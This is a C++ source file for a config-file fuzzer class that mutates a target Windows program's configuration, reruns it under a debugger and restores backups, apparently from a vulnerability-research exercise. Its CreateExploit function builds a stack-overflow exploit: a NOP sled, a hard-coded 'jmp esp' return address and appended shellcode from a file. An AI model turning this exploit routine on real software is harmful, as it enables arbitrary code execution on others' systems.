#include <iostream>
#include <iomanip>
#include <random>
#include <fstream>
#include <string>
#include <sstream>
#include <filesystem>
#include <exception>

#include "fuzzer.h"
#include "utility.h"

MyProgram::Fuzzer::
Fuzzer(
  const std::string& __exeName,
  const std::string& __confName
) : _exeName(__exeName),
    _confName(__confName) {
  bool __res;

  __res = LoadConfig();
  if (!__res) {
    Backup();
    __res = LoadConfig();
    if (!__res) { throw std::runtime_error("loading config file failed"); }
  }
}

MyProgram::Fuzzer::~Fuzzer() = default;

bool
MyProgram::Fuzzer::
LoadConfig() {
  std::string __confPath(PROGRAM_DIR);
  __confPath += '\\' + _confName;
  std::ifstream __cfgFile(__confPath, std::ios::binary);
  if (__cfgFile.is_open()) {

    __cfgFile.seekg(0, __cfgFile.end);
    auto __length = __cfgFile.tellg();
    __cfgFile.seekg(0, __cfgFile.beg);

    _data.clear();
    _data.reserve(size_t(__length));
    
    for (size_t i = 0; i < __length; ++i) {
      _data.push_back(uint8_t(__cfgFile.get()));
    }

    __cfgFile.close();

    if (_data.size() != __length) { return false; }
  }
  else {
    _Log("Cannot open config file", true);
    return false;
  }
  return true;
}

void
MyProgram::Fuzzer::
Backup() {
  std::string __backupDir(BACKUP_DIR);
  std::string __programDir(PROGRAM_DIR);
  std::string __dllName("func.dll");

  std::filesystem::copy_file(
    __backupDir + '\\' + _exeName,
    __programDir + '\\' + _exeName,
    std::filesystem::copy_options::overwrite_existing
  );
  std::filesystem::copy_file(
    __backupDir + '\\' + _confName,
    __programDir + '\\' + _confName,
    std::filesystem::copy_options::overwrite_existing
  );
  std::filesystem::copy_file(
    __backupDir + '\\' + __dllName,
    __programDir + '\\' + __dllName,
    std::filesystem::copy_options::overwrite_existing
  );
}

void
MyProgram::Fuzzer::
PrintConfig() { 
  auto __prev = std::cout.fill('0');
  for (const auto& __el : _data) {
    std::cout << std::setw(2) << std::hex << uint16_t(__el) << ' ';
  }
  std::cout.fill(__prev);
  std::cout << '\n';
}

bool 
MyProgram::Fuzzer::
FindDividings() {
  size_t __len = _data.size();
  size_t __divLen = _divs.size();
  size_t __pos = 0;
  if (__len == 0) {
    _Log("Config file not loaded", true);
    return false;
  }
  if (__divLen == 0) {
    _Log("Symbols for dividing fields not set", true);
    return false;
  }
  __pos = _FindDividings(__pos);
  if (__pos == __len + 1) {
    _Log("There is no dividing fields in the file", true);
    return false;
  } else {
    do {
      std::stringstream __msg;
      __msg.fill('0');
      __msg << "Dividing field found - " << _data[__pos] << " hex 0x"
        << std::setw(2) << std::hex << uint32_t(_data[__pos]) << " offset: 0x"
        << std::setw(16) << __pos;
      _Log(__msg.str(), true);
      __pos = _FindDividings(__pos + 1);
    } while (__pos <= __len);
  }
  return true;
}

void
MyProgram::Fuzzer::
ChangeBytes(size_t __offset, uint32_t __bytes, size_t __count) {
  size_t __len = _data.size();
  size_t __counter = 0;

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  
  std::cout << __len << '\n';

  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  if (__bytes <= 0xff) {
    uint8_t __tmp;
    for (size_t i = 0; i < __len - __offset; ++i) {
      __tmp = _data[__offset + i];
      _ChangeByte(__offset + i, uint8_t(__bytes), true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  } else if (__bytes > 0xff && __bytes <= 0xffff) {
    uint16_t __tmp;
    for (size_t i = 0; i < __len - __offset - 1; i+=2) {
      __tmp = (_data[__offset + i + 1] << 8) + _data[__offset + i];
      _ChangeWord(__offset + i, uint16_t(__bytes), true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  } else if (__bytes > 0xffff) {
    uint32_t __tmp;
    for (size_t i = 0; i < __len - __offset - 3; i+=4) {
      __tmp = (_data[__offset + i + 3] << 24) + (_data[__offset + i + 2] << 16)
        + (_data[__offset + i + 1] << 8) + _data[__offset + i];
      _ChangeDWord(__offset + i, __bytes, true);
      ++__counter;
      if (__counter >= __count && __count != 0) { break; }
    }
  }
}

void 
MyProgram::Fuzzer::
ChangeRandBytes(size_t __offset, size_t __count) {
  size_t __len = _data.size();
  size_t __counter = 0;
  uint8_t __tmp;

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }

  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  for (size_t i = 0; i < __len - __offset; ++i) {
    __tmp = _RandomByte();
    _ChangeByte(__offset + i, __tmp, true);
    ++__counter;
    if (__counter >= __count && __count != 0) { break; }
  }
}

void
MyProgram::Fuzzer::
InsertByte(size_t __offset, uint8_t __code, size_t __count) {
  size_t __len = _data.size();
  std::stringstream __msg;
  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  __msg.fill('0');
  if (__len < __offset) {
    _data.insert(_data.end(), __count, __code);
    __msg << "Fuzzer add to end file " << __count << " bytes 0x"
      << std::hex << std::setw(2) << uint32_t(__code);
  }	else {
    _data.insert(_data.begin() + __offset, __count, __code);
    __msg << "Fuzzer add to offset: 0x" << std::setw(16)
      << std::hex << __offset << ' ' << std::dec << __count
      << " bytes 0x" << std::setw(2) << std::hex << uint32_t(__code);
  }
  _Log(__msg.str(), true);
}

void 
MyProgram::Fuzzer::
InsertRandomByte(size_t __offset, size_t __count) {
  uint8_t __tmp;
  size_t __len = _data.size();
  std::stringstream __msg;
  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  __msg.fill('0');
  if (__len < __offset) {
    __msg << "Fuzzer insert random bytes to end of file:";
    for (size_t i = 0; i < __count; ++i) {
      __tmp = _RandomByte();
      __msg << " 0x" << std::setw(2) << std::hex << uint32_t(__tmp) << std::dec;
      _data.push_back(__tmp);
    }
  }	else {
    __msg << "Fuzzer insert random bytes to offset: 0x"
      << std::hex << std::setw(16) << __offset << " : " << std::dec;
    for (size_t i = 0; i < __count; ++i) {
      __tmp = _RandomByte();
      __msg << " 0x" << std::setw(2) << std::hex
        << uint32_t(__tmp) << " ";
      _data.insert(_data.begin() + __offset + i, 1, __tmp);
    }
  }

  _Log(__msg.str(), true);
}

void
MyProgram::Fuzzer::
DeleteByte(size_t __offset, size_t __count) {
  std::vector<uint8_t> __deleted;
  std::stringstream __msg;
  size_t __len = _data.size();

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  if (__offset > __len - 1) {
    _Log("Offset greater than file size", true);
    return;
  }

  auto __begIt = _data.begin() + __offset;
  auto __endIt = __begIt;

  if (__offset + __count > __len) {
    std::cout << "Count is to large... Removing bytes till EOF\n";
    __endIt = _data.end();
  } else { __endIt = __begIt + __count; }

  __deleted.assign(__begIt, __endIt);
  _data.erase(__begIt, __endIt);

  __msg.fill('0');
  __msg << "Fuzzer deleted " << __deleted.size() << " bytes from offset: 0x"
    << std::hex << std::setw(16) << __offset << " : " << std::dec;
  for (const auto& __el : __deleted) {
    __msg << " 0x" << std::setw(2) << std::hex << uint32_t(__el) << std::dec;
  }

  _Log(__msg.str(), true);
}

void
MyProgram::Fuzzer::
ExpandFields(size_t __offset, uint32_t __code, size_t __count) {
  size_t __len = _data.size();
  size_t __divLen = _divs.size();
  size_t __pos = 0;
  size_t __cnt= 0;

  if (__len == 0) {
    _Log("Config file not loaded", true);
    return;
  }
  if (__divLen == 0) {
    _Log("Symbols for dividing fields not set", true);
    return;
  }
  __pos = _FindDividings(__offset);
  if (__pos == __len + 1) {
    _Log("There is no dividing fields from offset", true);
    return;
  }
  do {
    std::stringstream __msg;
    __msg.fill('0');
    if (__code <= 0xff) {
      _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
      __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
        << " - byte 0x" << std::setw(2) << uint8_t(__code);
      __pos += 2;
      ++__cnt;
      _Log(__msg.str(), true);
      if (__cnt == __count) { break; }
    } else if ((__code > 0xff) && (__code <= 0xffff)) {
      _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
      _data.insert(_data.begin() + __pos + 1, 1, uint8_t(__code >> 8));
      __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
        << " - word 0x" << std::setw(4) << uint16_t(__code);
      __pos += 3;
      ++__cnt;
      _Log(__msg.str(), true);
      if (__cnt == __count) { break; }
    } else if (__code > 0xffff) {
      _data.insert(_data.begin() + __pos, 1, uint8_t(__code));
      _data.insert(_data.begin() + __pos + 1, 1, uint8_t(__code >> 8));
      _data.insert(_data.begin() + __pos + 2, 1, uint8_t(__code >> 16));
      _data.insert(_data.begin() + __pos + 3, 1, uint8_t(__code >> 24));
      __msg << "Expand field at offset: 0x" << std::setw(16) << std::hex << __pos
        << " - dword 0x" << std::setw(8) << uint32_t(__code);
      __pos += 5;
      ++__cnt;
      _Log(__msg.str(), true);
      if (__cnt == __count) { break; }
    }
    __len = _data.size();
    __pos = _FindDividings(__pos);
  } while (__pos <= __len);
}

void 
MyProgram::Fuzzer::
ExpandFieldsRandom(size_t __offset, size_t __count) {
  uint8_t __size = _RandomByte();
  uint32_t __tmp = 0;
  if (__size < 0x40) { __tmp = _RandomByte(); }
  else if (__size < 0x80) {
    __tmp = (_RandomByte() << 8) + _RandomByte();
  } else if (__size < 0xc0) {
    __tmp = (_RandomByte() << 16) + (_RandomByte() << 8) + _RandomByte();
  } else {
    __tmp = (_RandomByte() << 24) + (_RandomByte() << 16)
      + (_RandomByte() << 8) + _RandomByte();
  }
  ExpandFields(__offset, __tmp, __count);
}

bool
MyProgram::Fuzzer::
SaveConfig() {
  if (_data.empty()) {
    _Log("Config file not loaded", true);
    return false;
  }

  std::ofstream __cfgFile(
    _confName,
    std::ofstream::binary | std::ofstream::out | std::ofstream::trunc
  );

  if (!__cfgFile.is_open()) {
    _Log("Cannot open output config file", true);
    return false;
  }

  for (const auto& __el : _data) {
    __cfgFile << __el;
  }

  __cfgFile.close();

  return true;
}

DWORD
MyProgram::Fuzzer::
DryRun() {
  std::string __exePath(PROGRAM_DIR);
  __exePath += '\\' + _exeName;
  SaveConfig();
  MyProgram::Debugger __debugger(__exePath);
  return __debugger.Run();
}

void
MyProgram::Fuzzer::
ChangeAutoFuzzer() {
  Backup();
  LoadConfig();

  // Run program until all replacement occurs
  // byte
  {
    uint8_t __tmp;
    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      uint8_t __val = 0;
      do {
        __tmp = _ChangeByte(__pos, __val, true);
        DryRun();
        // Backup
        _ChangeByte(__pos, __tmp, false);

        ++__val;
      } while (__val != 0);
    }
  }

  // word
  {
    uint16_t __tmp;
    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      uint16_t __val = 0;
      do {
        __tmp = _ChangeWord(__pos, __val, true);
        DryRun();
        // Backup
        _ChangeWord(__pos, __tmp, false);

        ++__val;
      } while (__val != 0);
    }
  }

  // dword
  {
    uint32_t __tmp;
    for (size_t __pos = 0; __pos < _data.size(); ++__pos) {
      uint32_t __val = 0;
      do {
        __tmp = _ChangeDWord(__pos, __val, true);
        DryRun();
        // Backup
        _ChangeDWord(__pos, __tmp, false);

        ++__val;
      } while (__val != 0);
    }
  }
}

void
MyProgram::Fuzzer::
AppendAutoFuzzer() {
  Backup();
  LoadConfig();

  // Run program till first crash or all possible values is over

  uint16_t __cnt;
  
  __cnt = _ChangeWord(16, 0x00, false);

  for (uint16_t i = 1; i != 0; ++i) {
   InsertByte(_data.size(), _RandomByte(), 1);

   _ChangeWord(16, __cnt + i, false);

   SaveConfig();
   if (DryRun()) { break; }
  }
}

void
MyProgram::Fuzzer::
CreateExploit() {

  std::vector<uint8_t> _shellcode;
  std::fstream __shellFile(
    "shellcode.bin",
    std::fstream::in | std::fstream::binary
  );

  if (!__shellFile.is_open()) {
    _Log("Cannot open shellcode file", true);
    return;
  }

  __shellFile.seekg(0, __shellFile.end);
  auto __length = __shellFile.tellg();
  __shellFile.seekg(0, __shellFile.beg);

  _shellcode.clear();
  _shellcode.reserve(size_t(__length));
  
  for (size_t i = 0; i < __length; ++i) {
    _shellcode.push_back(uint8_t(__shellFile.get()));
  }

  __shellFile.close();

  if (_shellcode.size() != __length) { return; }

  // start from initial config
  Backup();
  LoadConfig();

  DeleteByte(size_t(0x30), _data.size() - 0x30);

  InsertByte(size_t(0x30), 0x90, 3016);

  // 0x62501297 - jmp esp addr
  ChangeBytes(size_t(3012 + 0x30), 0x62501297, 1);

  _data.insert(_data.end(), _shellcode.begin(), _shellcode.end());

  ChangeBytes(0x10, _data.size() -  0x30, 1);

  SaveConfig();
}

uint8_t
MyProgram::Fuzzer::
_ChangeByte(size_t __offset, uint8_t __code, bool __verbose) {
  std::stringstream __msg;
  uint8_t __tmp = _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change BYTE from 0x" << std::setw(2) << uint32_t(__tmp)
    << " to 0x" << std::setw(2) << uint32_t(__code);
  
  _data[__offset] = __code;

  if (__verbose) { _Log(__msg.str(), true); }

  return __tmp;
}

uint16_t 
MyProgram::Fuzzer::
_ChangeWord(size_t __offset, uint16_t __code, bool __verbose) {
  std::stringstream __msg;
  uint16_t __tmp = (_data[__offset + 1] << 8) + _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change WORD from 0x" << std::setw(4) << uint32_t(__tmp)
    << " to 0x" << std::setw(4) << uint32_t(__code);

  uint8_t __low = uint8_t(__code);
  uint8_t __high = uint8_t(__code >> 8);

  _data[__offset] = __low;
  _data[__offset + 1] = __high;

  if (__verbose) { _Log(__msg.str(), true); }

  return __tmp;
}

uint32_t 
MyProgram::Fuzzer::
_ChangeDWord(size_t __offset, uint32_t __code, bool __verbose) {
  std::stringstream __msg;
  uint32_t __tmp = (_data[__offset + 3] << 24) + (_data[__offset + 2] << 16)
    + (_data[__offset + 1] << 8) + _data[__offset];

  __msg.fill('0');
  __msg << "Offset: 0x" << std::hex << std::setw(16) << __offset
    << " fuzzer change DWORD from 0x" << std::setw(8) << __tmp
    << " to 0x" << std::setw(8) << __code;

  _data[__offset]		= uint8_t(__code);
  _data[__offset + 1]	= uint8_t(__code >> 8);
  _data[__offset + 2]	= uint8_t(__code >> 16);
  _data[__offset + 3]	= uint8_t(__code >> 24);

  if (__verbose) { _Log(__msg.str(), true); }

  return __tmp;
}

size_t 
MyProgram::Fuzzer::
_FindDividings(size_t __offset) {
  size_t __len = _data.size();
  size_t __divLen = _divs.size();

  if (__len == 0) { return __len + 1; }
  if (__divLen == 0) { return __len + 1; }
  if (__offset >= __len) { return __len + 1; }

  for (size_t i = __offset; i < __len; ++i) {
    for (size_t j = 0; j < __divLen; ++j) {
      if (_data[i] == _divs[j]) { return i; }
    }
  }
  return (__len + 1);
}

uint8_t
MyProgram::Fuzzer::
_RandomByte(){
  static std::default_random_engine __gen;
  std::uniform_int_distribution<> __dist(0, 0xff);
  return uint8_t(__dist(__gen));
}

void
MyProgram::Fuzzer::
_Log(const std::string& __msg, bool __verbose) {
  static std::string __log(LOG_FILE_PATH);
  if (__verbose) { std::cout << __msg << "\n"; }
  MyProgram::Log(__log, __msg);
}
